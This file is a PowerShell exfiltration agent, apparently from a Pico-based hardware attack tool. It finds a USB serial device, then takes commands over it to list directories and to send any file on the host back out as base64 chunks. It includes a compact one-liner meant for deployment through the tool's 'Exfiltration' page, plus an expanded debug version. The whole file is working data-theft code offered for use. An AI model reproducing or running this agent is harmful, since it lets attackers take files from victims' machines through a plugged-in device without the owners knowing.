<# ============================= Exfiltration Over Serial ==================================


This script is the full version of the one-liner used in the 'Deploy Agent' function on 'Exfiltration' page.
Run this manually for debugging and testing.

one-liner
---------------
function fp{(Get-WMIObject Win32_SerialPort | Where-Object PNPDeviceID -match "VID_239A").DeviceID};$d=fp;if(-not $d){exit};$p = New-Object System.IO.Ports.SerialPort $d,115200,None,8,one;$p.DtrEnable = $true;$p.RtsEnable = $true;$p.Open();function list_dir($path){try{$cleanPath=[System.IO.Path]::GetFullPath($path);if(-not (Test-Path $cleanPath)){return};Get-ChildItem -LiteralPath $cleanPath -Force | ForEach-Object{$type = if ($_.PSIsContainer) {"dir"} else {"file"};$line = "$($type)|||$($_.FullName)|||$($_.Length)";$p.WriteLine($line)}}catch{$p.WriteLine($msg)}};function send_file($path){try{$cleanPath = [System.IO.Path]::GetFullPath($path);$bytes = [IO.File]::ReadAllBytes($cleanPath);$b64 = [Convert]::ToBase64String($bytes);$p.WriteLine("[SIZE]$($b64.Length)");$p.BaseStream.Flush();$p.WriteLine("[BEGIN]");$p.BaseStream.Flush();for($i = 0; $i -lt $b64.Length; $i += 512){$chunk=$b64.Substring($i,[Math]::Min(512,$b64.Length - $i));$p.WriteLine("[CHUNK]$chunk");$p.BaseStream.Flush();Sleep -M 10}$p.WriteLine("[END]")}catch{}};while($true){$line = $p.ReadLine();if($line -match "exit agent"){exit};if($line -like "LIST*"){$path=$line -replace "LIST ?", "";if(-not $path){$path = "C:\"}$path=$path.Trim();list_dir $path}elseif($line -like "GET*"){$file=$line -replace "GET ","";send_file $file}}


#>

function fp {
    Write-Host "[DBG] Detecting Pico Serial Port..."
    (Get-WMIObject Win32_SerialPort | Where-Object PNPDeviceID -match "VID_239A").DeviceID
}

$d = fp
if (-not $d) {
    Write-Host "[ERR] No Pico serial port found."
    exit
}

Write-Host "[INFO] Opening Serial Port at $d..."
$p = New-Object System.IO.Ports.SerialPort $d,115200,None,8,one
$p.DtrEnable = $true
$p.RtsEnable = $true
$p.Open()

Write-Host "[OK] Port open. Listening for commands..."

function list_dir($path) {
    try {
        $cleanPath = [System.IO.Path]::GetFullPath($path)
        Write-Host "[DBG] Listing: $cleanPath"

        if (-not (Test-Path $cleanPath)) {
            $p.WriteLine("[ERR] Path does not exist: $cleanPath")
            return
        }

        Get-ChildItem -LiteralPath $cleanPath -Force | ForEach-Object {
            $type = if ($_.PSIsContainer) {"dir"} else {"file"}
            $line = "$($type)|||$($_.FullName)|||$($_.Length)"
            $p.WriteLine($line)
        }
    } catch {
        $msg = "[ERR] Failed to list path: $($_.Exception.Message)"
        Write-Host $msg
        $p.WriteLine($msg)
    }
}

function send_file($path) {
    try {
        $cleanPath = [System.IO.Path]::GetFullPath($path)
        Write-Host "$cleanPath"

            $bytes = [IO.File]::ReadAllBytes($cleanPath)
            $b64 = [Convert]::ToBase64String($bytes)
            Write-Host "Sending size:"
            $p.WriteLine("[SIZE]$($b64.Length)")
            $p.BaseStream.Flush()
            Write-Host "Sending begin:"
            $p.WriteLine("[BEGIN]")
            $p.BaseStream.Flush()
            for ($i = 0; $i -lt $b64.Length; $i += 512) {
                $chunk = $b64.Substring($i, [Math]::Min(512, $b64.Length - $i))
                Write-Host "Sending chunk: $($chunk.Substring(0,10))..."
                $p.WriteLine("[CHUNK]$chunk")
                $p.BaseStream.Flush()
                Start-Sleep -Milliseconds 10
            }
            $p.WriteLine("[END]")

    } catch {
        $p.WriteLine("[ERR] Exception during send: $($_.Exception.Message)")
    }
}


# Main loop
function loop {
    while ($true) {
        Write-Host "[WAIT] Waiting for serial command..."
        $line = $p.ReadLine()
        Write-Host "[RCV] $line"

        if ($line -match "exit agent") {
            Write-Host "[INFO] Exiting agent..."
            exit
        }

        if ($line -like "LIST*") {
            $path = $line -replace "LIST ?", ""
            if (-not $path) { $path = "C:\" }
            $path = $path.Trim()
            Write-Host "[ACT] Listing dir: '$path'"
            list_dir $path
        }elseif ($line -like "GET*") {
            $file = $line -replace "GET ", ""
            Write-Host "[ACT] Sending file: $file"
            send_file $file
        } else {
            $p.WriteLine("[ERR] Unknown command: $line")
        }
    }
}

loop
